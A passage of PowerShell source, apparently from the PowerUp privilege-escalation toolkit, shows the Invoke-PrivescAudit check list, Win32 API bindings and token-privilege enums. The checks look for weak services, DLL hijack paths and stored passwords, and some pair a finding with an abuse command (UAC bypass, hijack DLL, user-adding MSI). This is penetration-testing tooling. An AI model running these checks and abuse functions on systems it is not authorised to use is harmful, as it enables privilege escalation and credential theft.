            Command     = { if ((Get-ProcessTokenGroup | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Command "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { Get-ProcessTokenPrivilege -Special | Where-Object {$_} }
        },
        # Service checks
        @{
            Type    = 'Unquoted Service Paths'
            Command = { Get-UnquotedService }
        },
        @{
            Type    = 'Modifiable Service Files'
            Command = { Get-ModifiableServiceFile }
        },
        @{
            Type    = 'Modifiable Services'
            Command = { Get-ModifiableService }
        },
        # DLL hijacking
        @{
            Type        = '%PATH% .dll Hijacks'
            Command     = { Find-PathDLLHijack }
            AbuseScript = { "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        # Registry checks
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (Get-RegistryAlwaysInstallElevated){ New-Object PSObject } }
            AbuseScript = { 'Write-UserAddMSI' }
        },
        @{
            Type    = 'Registry Autologons'
            Command = { Get-RegistryAutoLogon }
        },
        @{
            Type    = 'Modifiable Registry Autorun'
            Command = { Get-ModifiableRegistryAutoRun }
        },
        # Other checks
        @{
            Type    = 'Modifiable Scheduled Task Files'
            Command = { Get-ModifiableScheduledTaskFile }
        },
        @{
            Type    = 'Unattended Install Files'
            Command = { Get-UnattendedInstallFile }
        },
        @{
            Type    = 'Encrypted web.config Strings'
            Command = { Get-WebConfig | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { Get-ApplicationHost | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { Get-SiteListPassword | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { Get-CachedGPPPassword | Where-Object {$_} }
        }
    )

    ForEach($Check in $Checks){
        Write-Verbose "Checking for $($Check.Type)..."
        $Results = . $Check.Command
        $Results | Where-Object {$_} | ForEach-Object {
            $_ | Add-Member Noteproperty 'Check' $Check.Type
            if ($Check.AbuseScript){
                $_ | Add-Member Noteproperty 'AbuseFunction' (. $Check.AbuseScript)
            }
        }
        switch($Format){
            Object { $Results }
            List   { "`n`n[*] Checking for $($Check.Type)..."; $Results | Format-List }
            HTML   { $Results | ConvertTo-HTML -Head $Header -Body "<H2>$($Check.Type)</H2>" | Out-File -Append $HtmlReportFile }
        }
    }

    if ($Format -eq 'HTML') {
        Write-Verbose "[*] Report written to '$HtmlReportFile' `n"
    }
}


# PSReflect signature specifications
$Module = New-InMemoryModule -ModuleName PowerUpModule
# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', '', Scope='Function')]

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @()),
    (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 OpenProcessToken ([Bool]) @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 LookupPrivilegeName ([Int]) @([IntPtr], [IntPtr], [String].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
)

# https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig             =   '0x00000001'
    ChangeConfig            =   '0x00000002'
    QueryStatus             =   '0x00000004'
    EnumerateDependents     =   '0x00000008'
    Start                   =   '0x00000010'
    Stop                    =   '0x00000020'
    PauseContinue           =   '0x00000040'
    Interrogate             =   '0x00000080'
    UserDefinedControl      =   '0x00000100'
    Delete                  =   '0x00010000'
    ReadControl             =   '0x00020000'
    WriteDac                =   '0x00040000'
    WriteOwner              =   '0x00080000'
    Synchronize             =   '0x00100000'
    AccessSystemSecurity    =   '0x01000000'
    GenericAll              =   '0x10000000'
    GenericExecute          =   '0x20000000'
    GenericWrite            =   '0x40000000'
    GenericRead             =   '0x80000000'
    AllAccess               =   '0x000F01FF'
} -Bitfield

$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_MANDATORY              =   '0x00000001'
    SE_GROUP_ENABLED_BY_DEFAULT     =   '0x00000002'
    SE_GROUP_ENABLED                =   '0x00000004'
    SE_GROUP_OWNER                  =   '0x00000008'
    SE_GROUP_USE_FOR_DENY_ONLY      =   '0x00000010'
    SE_GROUP_INTEGRITY              =   '0x00000020'
    SE_GROUP_RESOURCE               =   '0x20000000'
    SE_GROUP_INTEGRITY_ENABLED      =   '0xC0000000'
} -Bitfield

$LuidAttributes = psenum $Module PowerUp.LuidAttributes UInt32 @{
    DISABLED                            =   '0x00000000'
    SE_PRIVILEGE_ENABLED_BY_DEFAULT     =   '0x00000001'
    SE_PRIVILEGE_ENABLED                =   '0x00000002'
    SE_PRIVILEGE_REMOVED                =   '0x00000004'
    SE_PRIVILEGE_USED_FOR_ACCESS        =   '0x80000000'
} -Bitfield

$SecurityEntity = psenum $Module PowerUp.SecurityEntity UInt32 @{
    SeCreateTokenPrivilege              =   1
    SeAssignPrimaryTokenPrivilege       =   2
    SeLockMemoryPrivilege               =   3
    SeIncreaseQuotaPrivilege            =   4
    SeUnsolicitedInputPrivilege         =   5
    SeMachineAccountPrivilege           =   6
    SeTcbPrivilege                      =   7
    SeSecurityPrivilege                 =   8
    SeTakeOwnershipPrivilege            =   9
    SeLoadDriverPrivilege               =   10
    SeSystemProfilePrivilege            =   11
    SeSystemtimePrivilege               =   12
    SeProfileSingleProcessPrivilege     =   13
    SeIncreaseBasePriorityPrivilege     =   14
    SeCreatePagefilePrivilege           =   15
    SeCreatePermanentPrivilege          =   16
    SeBackupPrivilege                   =   17
    SeRestorePrivilege                  =   18
    SeShutdownPrivilege                 =   19
    SeDebugPrivilege                    =   20
    SeAuditPrivilege                    =   21
    SeSystemEnvironmentPrivilege        =   22
    SeChangeNotifyPrivilege             =   23
    SeRemoteShutdownPrivilege           =   24
    SeUndockPrivilege                   =   25
    SeSyncAgentPrivilege                =   26
    SeEnableDelegationPrivilege         =   27
    SeManageVolumePrivilege             =   28
    SeImpersonatePrivilege              =   29
    SeCreateGlobalPrivilege             =   30
    SeTrustedCredManAccessPrivilege     =   31
    SeRelabelPrivilege                  =   32
    SeIncreaseWorkingSetPrivilege       =   33
    SeTimeZonePrivilege                 =   34
    SeCreateSymbolicLinkPrivilege       =   35
}

$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_TYPE_ENUM = psenum $Module PowerUp.TokenTypeEnum UInt32 @{
    Primary         = 1
    Impersonation   = 2
}

$TOKEN_TYPE = struct $Module PowerUp.TokenType @{
    Type  = field 0 $TOKEN_TYPE_ENUM
}

$SECURITY_IMPERSONATION_LEVEL_ENUM = psenum $Module PowerUp.ImpersonationLevelEnum UInt32 @{
    Anonymous         =   0
    Identification    =   1
    Impersonation     =   2
    Delegation        =   3
}

$IMPERSONATION_LEVEL = struct $Module PowerUp.ImpersonationLevel @{
    ImpersonationLevel  = field 0 $SECURITY_IMPERSONATION_LEVEL_ENUM
}

$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$LUID = struct $Module PowerUp.Luid @{
    LowPart         =   field 0 $SecurityEntity
    HighPart        =   field 1 Int32
}

$LUID_AND_ATTRIBUTES = struct $Module PowerUp.LuidAndAttributes @{
    Luid         =   field 0 $LUID
    Attributes   =   field 1 UInt32
}

$TOKEN_PRIVILEGES = struct $Module PowerUp.TokenPrivileges @{
    PrivilegeCount  = field 0 UInt32
    Privileges      = field 1 $LUID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 50)
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$NTDll    = $Types['ntdll']

Set-Alias Get-CurrentUserTokenGroupSid Get-ProcessTokenGroup
Set-Alias Invoke-AllChecks Invoke-PrivescAudit
